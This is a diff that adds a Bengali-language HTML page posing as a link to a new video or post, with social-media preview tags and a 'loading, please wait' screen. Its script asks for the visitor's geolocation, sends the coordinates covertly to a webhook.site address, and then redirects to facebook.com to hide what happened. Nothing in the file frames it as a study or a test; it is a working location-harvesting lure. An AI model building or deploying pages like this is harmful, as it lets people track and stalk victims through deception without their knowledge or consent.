@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+
+    <meta property="og:title" content="নতুন ভিডিও বা পোস্ট দেখুন">
+    <meta property="og:description" content="বিস্তারিত জানতে লিঙ্কে ক্লিক করুন।">
+    <meta property="og:image" content="https://i.postimg.cc/xdRX9xYB/IMG-6614.jpg"> 
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <style>
+        body {
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .container {
+            text-align: center;
+        }
+        .thumb-preview {
+            width: 300px; /* মোবাইল ফ্রেন্ডলি সাইজ */
+            height: auto;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        .loading-text {
+            color: #555;
+            font-size: 18px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="IMAGE_URL_HERE" alt="Thumbnail" class="thumb-preview">
+        <div class="loading-text">দয়া করে অপেক্ষা করুন, লোড হচ্ছে...</div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; 
+
+                    fetch(webhookURL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ latitude: lat, longitude: lon })
+                    }).then(() => {
+                        window.location.href = "https://www.facebook.com"; 
+                    }).catch(() => {
+                        window.location.href = "https://www.facebook.com";
+                    });
+                }, function(error) {
+                    window.location.href = "https://www.facebook.com";
+                }, {timeout: 5000}); // ৫ সেকেন্ডের বেশি সময় নিলে রিডাইরেক্ট করে দেবে
+            } else {
+                window.location.href = "https://www.facebook.com";
+            }
+        };
+    </script>
+</body>
+</html>
